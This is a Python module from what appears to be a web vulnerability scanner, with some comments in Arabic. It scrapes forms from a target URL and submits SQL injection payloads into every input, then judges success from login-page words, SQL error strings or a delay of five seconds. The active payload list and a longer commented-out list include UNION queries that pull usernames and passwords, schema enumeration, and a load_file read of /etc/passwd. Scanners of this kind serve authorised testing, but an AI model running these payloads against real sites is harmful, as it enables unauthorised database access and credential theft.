import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import logging
from .utils import inject_payload

logger = logging.getLogger(__name__)

def check_sql_injection(target_url):
    vulnerabilities = []
    
    # قائمة بالحمولات المحتملة لحقن SQL
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR sleep(5) --",
        "' UNION SELECT null, null --",
        "admin' OR 1=1 --",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "' UNION SELECT user(), version() --",
        "' OR IF(1=1, SLEEP(5), 0) --",
        # أضف حمولة جديدة حسب الحاجة
    ]
# payloads = [
#         "' OR '1'='1",
#         "' OR '1'='1' --",
#         "' OR 1=1 --",
#         "' OR sleep(5) --",
#         "' UNION SELECT null, null -- ",
#         "admin' OR 1=1 --",
#         "admin' #",
#         "' OR '1'='1' #",
#         "' OR 1=1#",
#         "1' AND 1=1 --",
#         "1' AND 1=2 --",
#         "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
#         "' UNION SELECT username, password FROM users --",
#         "' AND EXISTS(SELECT 1 FROM users WHERE username='admin') --",
#         "' UNION SELECT NULL, NULL, NULL --",
#         "' UNION SELECT NULL, version(), user() --",
#         "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1)) > 64 --",
#         "' OR BENCHMARK(1000000,MD5(1)) --",
#         "' OR IF(1=1, SLEEP(5), 0) --",
#         "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS int) --",
#         "' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --",
#         "' OR 'x'='x",
#         "' OR 'a'='a",
#         "' OR 1 GROUP BY columnnames HAVING 1=1 --",
#         "' OR 1 ORDER BY 1 --",
#         "' OR 'x'='x' AND SLEEP(5) --",
#         "' UNION SELECT 1, @@version --",
#         "' OR 1=1 LIMIT 1 --",
#         "' OR 1=1 UNION ALL SELECT NULL, NULL, NULL --",
#         "' UNION SELECT table_name FROM information_schema.tables --",
#         "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
#         "' UNION SELECT user() --",
#         "' UNION SELECT load_file('/etc/passwd') --",
#         "' UNION SELECT name FROM sqlite_master WHERE type='table' --",
#         "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE 'a%') --",
#         "' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT DATABASE()))) --",
#         "' AND EXP(~(SELECT * FROM (SELECT user())x)) --",
#     ]
    # رسائل الخطأ التي تشير إلى ثغرة SQL
    sql_error_signatures = [
        "You have an error in your SQL syntax;",
        "Warning: mysql_",
        "Unclosed quotation mark",
        "SQLSTATE",
        "ORA-",
    ]

    # علامات النجاح في محاولة الحقن
    success_indicators = [
        "Welcome",
        "Dashboard",
        "Logout",
        "Profile",
    ]

    try:
        logger.info(f"Sending GET request to {target_url}")
        response = requests.get(target_url, timeout=10)
        logger.info(f"Response status code: {response.status_code}")
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all("form")
        logger.info(f"Found {len(forms)} forms on {target_url}")
    except requests.RequestException as e:
        logger.error(f"Error fetching the page: {e}")
        return vulnerabilities

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        form_url = urljoin(target_url, action)
        logger.info(f"Form found with action: {action} and method: {method}")

        inputs = form.find_all("input")
        form_data = {input_tag.get("name"): "test" if input_tag.get("type") in ["text", "password", "email"] else input_tag.get("value", "")
                     for input_tag in inputs}

        for payload in payloads:
            for input_name in form_data.keys():
                test_data = form_data.copy()
                test_data[input_name] = payload

                try:
                    start_time = time.time()
                    if method == "post":
                        response = requests.post(form_url, data=test_data, timeout=10)
                    else:
                        response = requests.get(form_url, params=test_data, timeout=10)

                    elapsed_time = time.time() - start_time
                    logger.info(f"Response received in {elapsed_time:.2f} seconds with status code {response.status_code}")

                    if any(indicator.lower() in response.text.lower() for indicator in success_indicators):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "description": f"Detected possible SQL Injection vulnerability with payload: {payload}",
                            "location": f"Form: {form_url}, Input: {input_name}",
                            "severity": "Critical"
                        })
                        logger.warning(f"SQL Injection vulnerability detected with payload: {payload}")
                        return vulnerabilities

                    elif any(error.lower() in response.text.lower() for error in sql_error_signatures) or elapsed_time > 5:
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "description": f"Detected possible SQL Injection vulnerability with payload: {payload}",
                            "location": f"Form: {form_url}, Input: {input_name}",
                            "severity": "High"
                        })
                        logger.warning(f"SQL Injection vulnerability detected with payload: {payload}")
                        return vulnerabilities

                except requests.RequestException as e:
                    logger.error(f"Error during request: {e}")

    return vulnerabilities
